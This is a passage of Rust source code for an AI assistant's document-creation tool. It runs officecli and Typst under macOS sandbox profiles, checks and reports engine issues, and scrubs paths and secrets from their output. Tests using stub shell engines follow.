    crate::config::create_private_dir_all(&packages).map_err(|_| unwritable())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&packages, std::fs::Permissions::from_mode(0o500))
            .map_err(|_| unwritable())?;
    }
    Ok(())
}

/// What an engine made.
struct Made {
    file: PathBuf,
    preview: Option<PathBuf>,
    /// Slides, sheets or pages, when the engine reports them.
    count: Option<u64>,
    issues: Vec<Issue>,
}

/// One engine at work in one document's folder.
struct Work<'a> {
    exe: &'a Path,
    dir: &'a Path,
    home: &'a Path,
    /// How the model knows the engine.
    name: &'static str,
    /// `sandbox-exec`, to run the engine under `profile`.
    sandbox: Option<&'a Path>,
    /// [`OFFICE_SANDBOX`] or [`TYPST_SANDBOX`].
    profile: &'static str,
    /// Where officecli keeps its own temporary files (see
    /// [`officecli_scratch`]); the profile lets it write there.
    scratch: Option<&'a Path>,
}

/// What officecli may do on macOS: no network; of the user's folders
/// (`/Users`, `/Volumes`) read only the document's own and the engine's;
/// write only the document's folder and its own temporary folder. File
/// names and sizes stay readable, so that paths resolve.
const OFFICE_SANDBOX: &str = r#"(version 1)
(allow default)
(deny network*)
(deny file-read-data (subpath "/Users") (subpath "/Volumes"))
(deny file-write*)
(allow file-write* (literal "/dev/null") (literal "/dev/zero") (literal "/dev/dtracehelper") (regex #"^/dev/tty"))
(allow file-read-data file-write* (subpath (param "DOC")))
(allow file-read-data file-write* (subpath (param "SCRATCH")))
(allow file-read-data (subpath (param "ENGINE")))"#;

/// What Typst may do on macOS: anything but the network. It reads system
/// and user fonts; `--root` keeps the body to the document's folder.
const TYPST_SANDBOX: &str = r#"(version 1)
(allow default)
(deny network*)"#;

/// `/tmp/officecli-<uid>`, where officecli keeps temporary files whatever
/// `TMPDIR` says: created private, refused when it is someone else's or a
/// link.
#[cfg(unix)]
fn officecli_scratch() -> Result<PathBuf, String> {
    use std::os::unix::fs::{DirBuilderExt, MetadataExt};
    let unsafe_folder = || {
        refuse(
            FAILED,
            "officecli's temporary folder is not a private folder",
        )
    };
    // SAFETY: getuid has no preconditions and cannot fail.
    let uid = unsafe { libc::getuid() };
    let path = PathBuf::from(format!("/tmp/officecli-{uid}"));
    match std::fs::DirBuilder::new().mode(0o700).create(&path) {
        Ok(()) => {}
        Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {}
        Err(_) => return Err(unsafe_folder()),
    }
    let meta = std::fs::symlink_metadata(&path).map_err(|_| unsafe_folder())?;
    if !meta.is_dir() || meta.uid() != uid {
        return Err(unsafe_folder());
    }
    path.canonicalize().map_err(|_| unsafe_folder())
}

#[cfg(not(unix))]
fn officecli_scratch() -> Result<PathBuf, String> {
    Err(refuse(FAILED, "officecli has no sandbox here"))
}

/// An absolute path outside the document's folder in engine text: a drive,
/// a share, or one under a file system's own first folder. Element paths
/// (`/slide[1]`) are not among them.
static OUTSIDE_PATH: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(
        r#"(?i)(?P<lead>^|[\s'"(=,:\[`])(?:[a-z]:[\\/]|\\\\|/(?:users|volumes|private|var|tmp|home|root|etc|opt|usr|applications|library|system|windows|programdata|mnt|media|dev|proc|sys|srv|run|snap|nix|sbin|bin|lib|cores|boot)\b)[^\s'"`<>|]*"#,
    )
    .expect("a valid pattern")
});

/// `path` as the sandbox matches it: with its links resolved.
fn real(path: &Path) -> String {
    path.canonicalize()
        .unwrap_or_else(|_| path.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

impl Work<'_> {
    async fn run(&self, args: &[&str]) -> Result<EngineOutput, String> {
        let output = match self.sandbox {
            Some(sandbox) => {
                let doc = format!("DOC={}", real(self.dir));
                let real_exe = PathBuf::from(real(self.exe));
                let engine = format!("ENGINE={}", real(real_exe.parent().unwrap_or(&real_exe)));
                let scratch = format!("SCRATCH={}", real(self.scratch.unwrap_or(self.dir)));
                let exe = self.exe.to_string_lossy();
                let wrapped = [
                    &[
                        "-D",
                        &doc,
                        "-D",
                        &engine,
                        "-D",
                        &scratch,
                        "-p",
                        self.profile,
                        &exe,
                    ][..],
                    args,
                ]
                .concat();
                run_engine(sandbox, &wrapped, self.dir, self.home, ENGINE_TIMEOUT).await
            }
            None => run_engine(self.exe, args, self.dir, self.home, ENGINE_TIMEOUT).await,
        };
        let output = output.map_err(|error| {
            log::warn!("[Assistant] {} could not run: {error}", self.name);
            refuse(
                FAILED,
                format!("{} could not run on this computer", self.name),
            )
        })?;
        if output.timed_out {
            return Err(refuse(
                FAILED,
                format!(
                    "{} did not finish within {} seconds; make the document smaller",
                    self.name,
                    ENGINE_TIMEOUT.as_secs()
                ),
            ));
        }
        Ok(output)
    }

    /// A check's JSON report, whatever its exit status says; `None` when it
    /// gave none. A check that fails leaves the file as it is.
    async fn report(&self, args: &[&str]) -> Option<Value> {
        match self.run(args).await {
            Ok(output) => serde_json::from_str(output.stdout.trim()).ok().or_else(|| {
                log::warn!("[Assistant] {} {} gave no report", self.name, args[0]);
                None
            }),
            Err(_) => None,
        }
    }

    /// Engine text as the model and the card may see it: the document's
    /// folder as `.`, and nothing that looks like a credential.
    fn shown(&self, text: &str) -> String {
        let mut folders: Vec<String> = vec![self.dir.display().to_string()];
        if let Ok(real) = self.dir.canonicalize() {
            folders.push(real.display().to_string());
        }
        // The longer first: the real path may contain the other.
        folders.sort_by_key(|folder| std::cmp::Reverse(folder.len()));
        let mut text = text.to_owned();
        for folder in folders.iter().filter(|folder| !folder.is_empty()) {
            text = text
                .replace(&format!("{folder}{}", std::path::MAIN_SEPARATOR), "")
                .replace(folder.as_str(), ".");
        }
        let text = OUTSIDE_PATH.replace_all(&text, "${lead}<path>");
        crate::redact::scrub(&text).into_owned()
    }

    /// What a failed run said, briefly.
    fn excerpt(&self, output: &EngineOutput) -> String {
        let said = [&output.stderr, &output.stdout]
            .into_iter()
            .map(|text| text.trim())
            .find(|text| !text.is_empty())
            .unwrap_or("no output");
        clip(&without_help(&self.shown(said)), MAX_ISSUE_CHARS)
    }
}

/// officecli's report without its `{"success", "data"}` envelope.
fn data(report: &Value) -> &Value {
    if report["data"].is_object() {
        &report["data"]
    } else {
        report
    }
}

/// An Office document: create the file, run the batch (atomic: one failed
/// command and nothing is applied), then check it and count it.
async fn make_office(work: &Work<'_>, format: DocumentFormat) -> Result<Made, String> {
    let file = format.file();
    let file = file.as_str();
    let created = work.run(&["create", file]).await?;
    if created.status != Some(0) || !work.dir.join(file).is_file() {
        return Err(refuse(
            FAILED,
            format!(
                "officecli could not create the file: {}",
                work.excerpt(&created)
            ),
        ));
    }
    let batch = work
        .run(&["batch", file, "--input", BATCH, "--json"])
        .await?;
    let mut issues = batch_issues(work, &batch)?;
    if let Some(report) = work.report(&["validate", file, "--json"]).await {
        issues.extend(validation_issues(work, &report));
    }
    let view = [
        "view",
        file,
        "issues",
        "--limit",
        VIEW_ISSUES_LIMIT,
        "--json",
    ];
    if let Some(report) = work.report(&view).await {
        issues.extend(view_issues(work, &report));
    }
    let count = match format.count() {
        Some(key) => work
            .report(&["view", file, "stats", "--json"])
            .await
            .and_then(|report| data(&report)[key].as_u64()),
        None => None,
    };
    let preview = if format == DocumentFormat::Pptx {
        svg_preview(work, file).await
    } else {
        None
    };
    Ok(Made {
        file: work.dir.join(file),
        preview,
        count,
        issues: finished(issues),
    })
}

/// The warnings of a batch that ran, or the failure of one that did not.
fn batch_issues(work: &Work<'_>, output: &EngineOutput) -> Result<Vec<Issue>, String> {
    let Ok(report) = serde_json::from_str::<Value>(output.stdout.trim()) else {
        return Err(refuse(
            FAILED,
            format!(
                "officecli did not report on the batch: {}",
                work.excerpt(output)
            ),
        ));
    };
    let data = data(&report);
    let results = data["results"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    let failed: Vec<&Value> = results
        .iter()
        .filter(|item| item["success"] == false)
        .collect();
    let rolled_back =
        data["summary"]["atomicRolledBack"] == true || data["atomicRolledBack"] == true;
    if failed.is_empty() && !rolled_back && output.status == Some(0) && report["success"] != false {
        return Ok(results
            .iter()
            .flat_map(|item| item_warnings(work, item))
            .collect());
    }
    Err(batch_failure(work, &report, &failed, results.len()))
}

/// A failed batch for the model, in one line of JSON the runtime passes on
/// whole: what to do, and the first failed commands with officecli's words.
fn batch_failure(work: &Work<'_>, report: &Value, failed: &[&Value], total: usize) -> String {
    let message = if failed.is_empty() {
        let why = report["error"]["error"]
            .as_str()
            .or(report["error"].as_str())
            .map(|why| without_help(&work.shown(why)))
            .unwrap_or_else(|| "it gave no reason".into());
        format!(
            "officecli refused the batch and made nothing: {}",
            clip(&why, MAX_ISSUE_CHARS)
        )
    } else {
        let listed = if failed.len() > MAX_LISTED_FAILURES {
            format!("; the first {MAX_LISTED_FAILURES} are listed")
        } else {
            String::new()
        };
        format!(
            "{} of {total} commands failed (index counts from 0), so the batch was rolled back and nothing was made{listed}. Fix them and send the whole batch again.",
            failed.len()
        )
    };
    let mut items: Vec<Value> = failed
        .iter()
        .take(MAX_LISTED_FAILURES)
        .map(|item| {
            let mut shown = Map::new();
            shown.insert("index".into(), item["index"].clone());
            if let Some(code) = item["code"].as_str() {
                shown.insert("code".into(), json!(clip(code, 40)));
            }
            let said = item["error"]
                .as_str()
                .or(item["output"].as_str())
                .unwrap_or("failed");
            let said: String = without_help(&work.shown(said))
                .chars()
                .map(|c| if c.is_control() { ' ' } else { c })
                .collect();
            shown.insert("output".into(), json!(clip(&said, MAX_FAILURE_CHARS)));
            Value::Object(shown)
        })
        .collect();
    loop {
        let mut body = json!({ "message": message });
        if !items.is_empty() {
            body["items"] = json!(items);
        }
        let error = refuse(FAILED, body.to_string());
        if error.chars().count() <= MAX_ERROR_CHARS || items.pop().is_none() {
            return error;
        }
    }
}

/// What a command that ran warned about: its `warnings`/`warning` (except
/// advisories, such as a built-in style officecli added itself) and the
/// `WARNING:` lines of its output, such as unsupported properties.
fn item_warnings(work: &Work<'_>, item: &Value) -> Vec<Issue> {
    let index = item["index"].as_u64();
    let label = |text: &str| {
        let text = without_help(&work.shown(text));
        match index {
            Some(index) => format!("item {index}: {text}"),
            None => text,
        }
    };
    let output = item["output"].as_str().unwrap_or_default();
    // "Added shape at /slide[1]/shape[@id=100000]"
    let place = output
        .lines()
        .next()
        .and_then(|line| line.rsplit_once(" at "))
        .map(|(_, at)| at.trim())
        .filter(|at| at.starts_with('/'))
        .map(|at| work.shown(at));
    let mut issues = vec![];
    let warnings = item["warnings"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    for warning in warnings.iter().chain(item.get("warning")) {
        if warning["code"] == "advisory" {
            continue;
        }
        if let Some(text) = warning
            .as_str()
            .or(warning["message"].as_str())
            .filter(|text| !text.trim().is_empty())
        {
            issues.push(Issue::warning(label(text), place.clone()));
        }
    }
    for line in output.lines().map(str::trim) {
        let Some(text) = line
            .get(..8)
            .filter(|head| head.eq_ignore_ascii_case("warning:"))
            .map(|_| line[8..].trim())
        else {
            continue;
        };
        // "UNSUPPORTED props on /body/p[@paraId=…]: wobble (not supported)"
        let path = text
            .split_once(" on /")
            .map(|(_, rest)| format!("/{}", rest.split_once(": ").map_or(rest, |(at, _)| at)))
            .map(|path| work.shown(&path))
            .or_else(|| place.clone());
        issues.push(Issue::warning(label(text), path));
    }
    issues
}

/// `validate --json`: schema errors, which may keep Office from opening it.
fn validation_issues(work: &Work<'_>, report: &Value) -> Vec<Issue> {
    let errors = data(report)["errors"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    errors
        .iter()
        .filter_map(|error| {
            let description = error["description"]
                .as_str()
                .or(error["message"].as_str())?;
            let message = match error["type"].as_str() {
                Some(kind) => format!("{kind}: {description}"),
                None => description.to_owned(),
            };
            Some(Issue {
                severity: "error",
                message: work.shown(&message),
                path: error["path"].as_str().map(|path| work.shown(path)),
            })
        })
        .collect()
}

/// `view issues --json`: formatting and content problems.
fn view_issues(work: &Work<'_>, report: &Value) -> Vec<Issue> {
    let found = data(report)["issues"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    found
        .iter()
        .filter_map(|issue| {
            let message = issue["message"].as_str().filter(|m| !m.trim().is_empty())?;
            Some(Issue {
                severity: severity(&issue["severity"]),
                message: work.shown(message),
                path: issue["path"].as_str().map(|path| work.shown(path)),
            })
        })
        .collect()
}

/// The first slide as SVG, kept as `preview-1.svg` for the runtime's
/// thumbnail; `None` when officecli drew none, or more than the runner keeps.
async fn svg_preview(work: &Work<'_>, file: &str) -> Option<PathBuf> {
    let output = work
        .run(&["view", file, "svg", "--start", "1"])
        .await
        .ok()?;
    let svg = output.stdout.trim();
    // The runner keeps at most OUTPUT_LIMIT bytes: a longer one was cut.
    let whole = output.status == Some(0)
        && output.stdout.len() + 4 < OUTPUT_LIMIT
        && svg.starts_with('<')
        && svg.contains("<svg")
        && svg.ends_with('>');
    if !whole {
        log::warn!("[Assistant] officecli drew no usable slide preview");
        return None;
    }
    let path = work.dir.join("preview-1.svg");
    let (target, bytes) = (path.clone(), svg.as_bytes().to_vec());
    blocking(move || write_new(&target, &bytes)).await.ok()?;
    Some(path)
}

/// A PDF: compile the prelude and the body, then render the first page as
/// the preview. Typst's warnings are the issues.
async fn make_pdf(work: &Work<'_>, body: &str) -> Result<Made, String> {
    let file = DocumentFormat::Pdf.file();
    let file = file.as_str();
    let compile = ["compile", "--root", ".", "--diagnostic-format", "short"];
    let compiled = work.run(&[&compile[..], &[MAIN, file]].concat()).await?;
    if compiled.status != Some(0) || !work.dir.join(file).is_file() {
        return Err(typst_failure(work, &compiled.stderr, body));
    }
    let issues = typst_warnings(work, &compiled.stderr);
    let png = [
        "--format",
        "png",
        "--pages",
        "1",
        "--ppi",
        "96",
        MAIN,
        "preview-{p}.png",
    ];
    let preview = match work.run(&[&compile[..], &png[..]].concat()).await {
        Ok(output) if output.status == Some(0) => {
            Some(work.dir.join("preview-1.png")).filter(|path| path.is_file())
        }
        _ => None,
    };
    let path = work.dir.join(file);
    let pages = blocking({
        let path = path.clone();
        move || Ok(std::fs::read(&path).ok().as_deref().and_then(pdf_pages))
    })
    .await?;
    Ok(Made {
        file: path,
        preview,
        count: pages,
        issues: finished(issues),
    })
}

/// A Typst diagnostic of `--diagnostic-format short`:
/// `main.typ:LINE:COLUMN: SEVERITY: MESSAGE`.
struct Diagnostic<'a> {
    line: usize,
    column: &'a str,
    severity: &'a str,
    message: &'a str,
}

fn diagnostic(line: &str) -> Option<Diagnostic<'_>> {
    let rest = line.strip_prefix(MAIN)?.strip_prefix(':')?;
    let (number, rest) = rest.split_once(':')?;
    let (column, rest) = rest.split_once(": ")?;
    let (severity, message) = rest.split_once(": ")?;
    Some(Diagnostic {
        line: number.parse().ok()?,
        column,
        severity,
        message,
    })
}

/// The body's line number of a line of `main.typ`; `None` in the prelude.
fn body_line(line: usize) -> Option<usize> {
    line.checked_sub(PRELUDE.lines().count())
        .filter(|line| *line > 0)
}

/// Typst's warnings about the body. The prelude's own are left out, and so
/// are missing fonts: the prelude names a fallback chain, so some of its
/// fonts are always missing.
fn typst_warnings(work: &Work<'_>, stderr: &str) -> Vec<Issue> {
    stderr
        .lines()
        .filter_map(diagnostic)
        .filter(|d| d.severity == "warning" && !d.message.contains("unknown font family"))
        .filter_map(|d| {
            let line = body_line(d.line)?;
            Some(Issue::warning(
                work.shown(d.message),
                Some(format!("line {line}, column {}", d.column)),
            ))
        })
        .collect()
}

/// Why the body did not compile: each error at its line of the body, with
/// that line, and anything else Typst said.
fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
    let said: Vec<String> = stderr
        .lines()
        .filter(|line| !line.trim().is_empty())
        .filter_map(|line| match diagnostic(line) {
            Some(d) if d.severity == "warning" => None,
            // Typst's words are scrubbed; the quoted line is the model's own.
            Some(d) => Some(match body_line(d.line) {
                Some(number) => {
                    let source = body.lines().nth(number - 1).unwrap_or_default().trim();
                    format!(
                        "line {number}, column {}: {}: {}\n    {}",
                        d.column,
                        d.severity,
                        work.shown(d.message),
                        clip(source, MAX_PATH_CHARS)
                    )
                }
                None => format!("{}: {}", d.severity, work.shown(d.message)),
            }),
            None => Some(work.shown(line)),
        })
        .collect();
    let detail = if said.is_empty() {
        "Typst stopped without saying why".to_owned()
    } else {
        said.join("\n")
    };
    refuse(
        FAILED,
        clip(
            &format!("Typst could not compile the body:\n{detail}"),
            MAX_ERROR_CHARS,
        ),
    )
}

impl AssistantHost {
    /// A `create_document` call of a chat run: checked as a generation
    /// tool's (identity, repeated call ids, a stop leaves its outcome
    /// unknown), and answered with the file, or with what to change.
    pub(in crate::services::assistant) async fn dispatch_document_tool(
        self: &Arc<Self>,
        run: &Arc<RunControl>,
        params: &Value,
    ) -> Result<Value, String> {
        let call = self.tool_call(run, params).await?;
        let media = run
            .media
            .as_ref()
            .filter(|_| !run.compact_only)
            .ok_or(DISABLED)?;
        let fingerprint = fingerprint(&call)?;
        if let Some(earlier) = media.begin_call(&call.tool_call_id, &fingerprint) {
            return earlier;
        }
        let work = self.create_document(run, media, &call.tool_call_id, &call.args);
        let mut cancel = run.cancel.subscribe();
        let result = tokio::select! {
            biased;
            _ = cancel.wait_for(|cancelled| *cancelled) => Err(UNKNOWN.to_string()),
            result = work => result,
        };
        let result = result.map_err(|error| scrub_secrets(&error, &run.secrets()));
        media.end_call(call.tool_call_id, fingerprint, &result)?;
        result
    }

    async fn create_document(
        &self,
        run: &Arc<RunControl>,
        media: &MediaRun,
        call_id: &str,
        args: &Value,
    ) -> Result<Value, String> {
        let args: CreateDocumentArgs = serde_json::from_value(args.clone()).map_err(|_| {
            refuse(
                FAILED,
                "unknown or malformed arguments: name, format (pptx, docx, xlsx, pdf, md, txt, csv, html or json) and content are expected",
            )
        })?;
        let engine = engine_for(args.format, &self.engines())?;
        let document = Document::new(args)?;
        if !media.reserve_document(MAX_DOCUMENTS_PER_RUN) {
            return Err(refuse(
                LIMIT,
                format!("at most {MAX_DOCUMENTS_PER_RUN} documents per reply"),
            ));
        }
        let made = self.make_document(run, call_id, &document, engine).await;
        if made.is_err() {
            media.release_document();
        }
        made
    }

    /// The `sandbox-exec` an engine runs under: tried once per engine, with
    /// `--version` under its profile. Without it (not macOS, or the probe
    /// failed) the batch checks and the dead proxy alone hold the engine.
    async fn engine_sandbox(
        &self,
        cell: &tokio::sync::OnceCell<Option<PathBuf>>,
        work: &Work<'_>,
    ) -> Option<PathBuf> {
        cell.get_or_init(|| async {
            let sandbox = self.env.sandbox_exec().filter(|path| path.is_file());
            let Some(sandbox) = sandbox else {
                log::warn!(
                    "[Assistant] sandbox-exec is unavailable; {} runs without it",
                    work.name
                );
                return None;
            };
            let probe = Work {
                sandbox: Some(&sandbox),
                ..*work
            };
            match probe.run(&["--version"]).await {
                Ok(output) if output.status == Some(0) => Some(sandbox),
                _ => {
                    log::warn!(
                        "[Assistant] {} does not run under sandbox-exec; it runs without it",
                        work.name
                    );
                    None
                }
            }
        })
        .await
        .clone()
    }

    async fn make_document(
        &self,
        run: &Arc<RunControl>,
        call_id: &str,
        document: &Document,
        engine: Option<PathBuf>,
    ) -> Result<Value, String> {
        let mid = run.reply_id();
        attachments::tool_room(&self.load(run).await?, 1, 0)?;
        let store = self.store(&run.identity.owner)?;
        let (dir, home) = blocking({
            let (store, sid) = (store.clone(), run.session_id.clone());
            let (document, language) = (document.clone(), run.ui_language.clone());
            move || prepare(&store, &sid, &document, &language)
        })
        .await?;
        let format = document.format;
        let made = match (format.engine(), engine.as_deref(), &document.content) {
            (Engine::Office, Some(exe), _) => {
                let scratch = match self.env.sandbox_exec() {
                    Some(_) => Some(blocking(officecli_scratch).await?),
                    None => None,
                };
                let mut work = Work {
                    exe,
                    dir: &dir,
                    home: &home,
                    name: "officecli",
                    sandbox: None,
                    profile: OFFICE_SANDBOX,
                    scratch: scratch.as_deref(),
                };
                let sandbox = self.engine_sandbox(&self.office_sandbox, &work).await;
                work.sandbox = sandbox.as_deref();
                make_office(&work, format).await?
            }
            (Engine::Typst, Some(exe), Content::Text(body)) => {
                let mut work = Work {
                    exe,
                    dir: &dir,
                    home: &home,
                    name: "Typst",
                    sandbox: None,
                    profile: TYPST_SANDBOX,
                    scratch: None,
                };
                let sandbox = self.engine_sandbox(&self.typst_sandbox, &work).await;
                work.sandbox = sandbox.as_deref();
                make_pdf(&work, body).await?
            }
            (Engine::Text, _, _) => Made {
                file: dir.join(format.file()),
                preview: None,
                count: None,
                issues: vec![],
            },
            _ => return Err(DISABLED.into()),
        };
        let issues = serde_json::to_value(&made.issues).map_err(|_| PROTOCOL)?;
        let mut params =
            json!({"name": document.name, "format": format.extension(), "issues": issues});
        if let (Some(key), Some(count)) = (format.count(), made.count) {
            params[key] = json!(count);
        }
        scrub_secrets_in(&mut params, &self.known_keys());
        let mut record = MediaRecord {
            tool_call_id: Some(call_id.into()),
            kind: "document".into(),
            apex: Some(run.identity.apex.clone()),
            submitted_at: Some(now()),
            params,
            status: "completed".into(),
            // Made on this computer: free, and a reply's total stays known.
            cost: Some("0".into()),
            ..Default::default()
        };
        let attachment = blocking({
            let (sid, mid, run) = (run.session_id.clone(), mid.clone(), run.clone());
            let (path, name, record) = (made.file.clone(), document.name.clone(), record.clone());
            move || {
                let mut file = std::fs::File::open(&path)
                    .map_err(|_| refuse(FAILED, "the engine finished without writing the file"))?;
                attachments::generated_file(&store, &sid, &mid, &mut file, &name, record, |saved| {
                    still_running(saved, &run)
                })
                .map_err(|error| {
                    if error == attachments::UNSUPPORTED {
                        refuse(
                            FAILED,
                            format!("the engine wrote no valid {} file", format.extension()),
                        )
                    } else {
                        error
                    }
                })
            }
        })
        .await?;
        record.outputs = vec![attachment.id.clone()];
        self.publish_generation(run, &mid, &record, std::slice::from_ref(&attachment));
        let mut file = json!({
            "id": attachment.id, "name": attachment.name,
            "mimeType": attachment.mime_type, "bytes": attachment.size_bytes,
        });
        // The runtime counts a PDF's pages for the model itself.
        if let (Some(key), Some(count)) = (format.count(), made.count) {
            if format != DocumentFormat::Pdf {
                file[key] = json!(count);
            }
        }
        Ok(json!({
            "status": "completed",
            "file": file,
            "issues": record.params["issues"],
            "filePath": made.file.to_string_lossy(),
            "previewPath": made.preview.as_deref().map(Path::to_string_lossy),
        }))
    }
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use crate::services::assistant::{
        catalog,
        host::{Admit, BoxFuture, Environment, Identity},
        media_tools::host::MediaRun,
        types::{id, now, Event, RunRef, SendRequest},
    };
    use serde_json::json;
    use std::path::{Path, PathBuf};
    use std::sync::Mutex;

    const PPTX: &str = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
    const SECRET: &str = "test-document-run-key-0123456789";

    struct Env {
        root: PathBuf,
        runtime: PathBuf,
        sandbox: Option<PathBuf>,
        events: Mutex<Vec<Event>>,
    }

    impl Environment for Env {
        fn sandbox_exec(&self) -> Option<PathBuf> {
            self.sandbox.clone()
        }
        fn identity(&self) -> BoxFuture<'_, Result<Identity, String>> {
            Box::pin(async { Ok(identity()) })
        }
        fn api_key<'a>(
            &'a self,
            _: &'a Identity,
            _: Option<&'a str>,
            _: &'a Admit<'a>,
        ) -> BoxFuture<'a, Result<String, String>> {
            Box::pin(async { Err("assistant_key_unavailable".to_string()) })
        }
        fn key_ready<'a>(&'a self, _: &'a Identity) -> BoxFuture<'a, bool> {
            Box::pin(async { false })
        }
        fn models<'a>(
            &'a self,
            _: &'a str,
            _: catalog::Source,
        ) -> BoxFuture<'a, Result<Vec<catalog::Model>, String>> {
            Box::pin(async { Ok(vec![]) })
        }
        fn gateway_base(&self, _: &str) -> Result<String, String> {
            Err("assistant_unknown_apex".into())
        }
        fn config_dir(&self) -> PathBuf {
            self.root.clone()
        }
        fn runtime_dir(&self) -> Result<PathBuf, String> {
            Ok(self.runtime.clone())
        }
        fn emit(&self, event: Event) {
            self.events.lock().unwrap().push(event);
        }
    }

    fn identity() -> Identity {
        Identity {
            owner: "d0".repeat(32),
            apex: "ofox.ai".into(),
        }
    }

    // The tests that run engines take turns (`document_engines`). Each
    // writes and runs new executables; all at once, they kept the script of
    // `runner::tests::run_engine_kills_what_the_engine_started_and_keeps_its_output`
    // from starting within its 3 s deadline (measured on macOS, where a new
    // executable is checked on its first run).

    /// A conversation with a live chat run, its reply, and stand-in engines:
    /// `officecli` and `typst` are shell bodies, `None` leaves the engine out.
    struct Fixture {
        root: tempfile::TempDir,
        env: Arc<Env>,
        host: Arc<AssistantHost>,
        run: Arc<RunControl>,
        sid: String,
    }

    /// A stand-in engine with the shell body `script`, or `link:<path>` to
    /// a real one.
    fn engine(dir: &Path, name: &str, script: &str) -> String {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("engines").join(name).join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        if let Some(target) = script.strip_prefix("link:") {
            std::os::unix::fs::symlink(target, &path).unwrap();
        } else {
            std::fs::write(&path, format!("#!/bin/sh\n{script}\n")).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        format!("engines/{name}/{name}")
    }

    fn fixture(officecli: Option<&str>, typst: Option<&str>) -> Fixture {
        fixture_in(officecli, typst, |_| None)
    }

    /// [`fixture`] with the `sandbox-exec` that `sandbox` gives for the
    /// fixture's folder.
    fn fixture_in(
        officecli: Option<&str>,
        typst: Option<&str>,
        sandbox: impl FnOnce(&Path) -> Option<PathBuf>,
    ) -> Fixture {
        let root = tempfile::tempdir().unwrap();
        let sandbox = sandbox(root.path());
        let runtime = root.path().join("runtime");
        std::fs::create_dir_all(&runtime).unwrap();
        let mut engines = serde_json::Map::new();
        for (name, script) in [("officecli", officecli), ("typst", typst)] {
            if let Some(script) = script {
                engines.insert(name.into(), json!({"path": engine(&runtime, name, script)}));
            }
        }
        std::fs::write(
            runtime.join("manifest.json"),
            json!({"engines": engines}).to_string(),
        )
        .unwrap();
        let env = Arc::new(Env {
            root: root.path().join("config"),
            runtime,
            sandbox,
            events: Mutex::default(),
        });
        let host = AssistantHost::new(env.clone());
        let store = host.store(&identity().owner).unwrap();
        let sid = store.create("test/chat", false).unwrap().session.id;
        let send: SendRequest = serde_json::from_value(json!({
            "sessionId": sid, "runId": id(), "operationId": id(), "text": "make a file",
        }))
        .unwrap();
        let mut control = RunControl::new(identity(), &send, SECRET.into());
        control.media = Some(MediaRun::new(Default::default()));
        control.ui_language = "en".into();
        let run = Arc::new(control);
        host.register_run(run.clone(), host.generation(), || {
            store.mutate(&sid, |record| {
                record.session.active_run = Some(RunRef {
                    run_id: run.run_id.clone(),
                    operation_id: run.operation_id.clone(),
                });
                record.messages.push(
                    serde_json::from_value(json!({
                        "id": run.message_id, "role": "assistant", "content": "",
                        "createdAt": now(), "status": "streaming", "runId": run.run_id,
                    }))
                    .unwrap(),
                );
                Ok(())
            })
        })
        .unwrap();
        Fixture {
            root,
            env,
            host,
            run,
            sid,
        }
    }

    impl Fixture {
        async fn call(&self, call: &str, args: Value) -> Result<Value, String> {
            self.host
                .dispatch_document_tool(
                    &self.run,
                    &json!({
                        "sessionId": self.sid, "runId": self.run.run_id,
                        "operationId": self.run.operation_id, "toolCallId": call,
                        "name": "create_document", "args": args,
                    }),
                )
                .await
        }

        fn record(&self) -> crate::services::assistant::store::SessionRecord {
            self.host
                .store(&identity().owner)
                .unwrap()
                .load_record(&self.sid)
                .unwrap()
        }

        /// The folders documents were made in.
        fn outputs(&self) -> Vec<PathBuf> {
            let root = self
                .root
                .path()
                .join("config/assistant")
                .join(identity().owner)
                .join(&self.sid)
                .join("outputs");
            match std::fs::read_dir(root) {
                Ok(entries) => entries.map(|e| e.unwrap().path()).collect(),
                Err(_) => vec![],
            }
        }

        fn events(&self, kind: &str) -> Vec<Value> {
            self.env
                .events
                .lock()
                .unwrap()
                .iter()
                .filter(|e| e.r#type == kind)
                .map(|e| e.data.clone())
                .collect()
        }
    }

    /// The code of a refusal: what comes before its first colon.
    fn code(error: &str) -> &str {
        error.split_once(':').map_or(error, |(code, _)| code)
    }

    /// The JSON after a refusal's code.
    fn body(error: &str) -> Value {
        serde_json::from_str(error.split_once(": ").unwrap().1).unwrap()
    }

    /// A stand-in officecli: `create` writes a zip header, `batch` saves
    /// the batch it got and prints `batch`, the views print `issues`,
    /// `stats` and an SVG.
    fn officecli(batch: &str, issues: &str, stats: &str) -> String {
        format!(
            r#"case "$1" in
create) printf 'PK\003\004stub' > "$2" ;;
batch) cp "$4" batch-seen.json; cat <<'JSON'
{batch}
JSON
;;
validate) echo '{{"valid":true}}' ;;
view) case "$3" in
  issues) cat <<'JSON'
{issues}
JSON
;;
  stats) echo '{stats}' ;;
  svg) echo '<svg/>' ;;
  esac ;;
esac"#
        )
    }

    fn deck() -> Value {
        json!([{"command": "add", "parent": "/", "type": "slide", "props": {"title": "Hi"}}])
    }

    const TYPST_OK: &str = r#"for a; do last=$a; done
echo "$*" >> typst-args
[ -w "$TYPST_PACKAGE_PATH" ] && echo writable > packages-writable
case " $* " in
*" --format png "*) printf '\211PNG\r\n\032\n' > preview-1.png ;;
*) printf '%%PDF-1.7\n1 0 obj << /Type /Page >>\n2 0 obj << /Type /Pages /Count 1 >>\n3 0 obj << /Type /Page>>\n' > "$last" ;;
esac"#;

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn create_pptx_runs_batch_and_imports_attachment() {
        let f = fixture(
            Some(&officecli(
                r#"{"results":[{"index":0,"success":true}]}"#,
                r#"{"issues":[]}"#,
                r#"{"slides":3}"#,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "Plan.pptx", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed");
